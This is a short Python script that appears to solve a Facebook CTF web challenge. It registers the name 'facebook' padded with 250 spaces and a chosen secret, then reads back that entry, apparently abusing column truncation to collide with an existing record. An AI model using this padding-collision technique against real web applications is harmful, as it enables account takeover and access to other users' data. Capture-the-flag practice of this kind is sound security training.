import requests

url = 'http://challenges.fbctf.com:8087/add.php'
payload = 'facebook' + ' '*250
res = requests.post(url, data={"name":payload, "secret":"Playctf444fun", "description":"Playctf444fun"})
print(res.text)

url2 = 'http://challenges.fbctf.com:8087/view.php'
res2 = requests.post(url2, data={"name":"facebook", "secret":"Playctf444fun"})
print(res2.text)
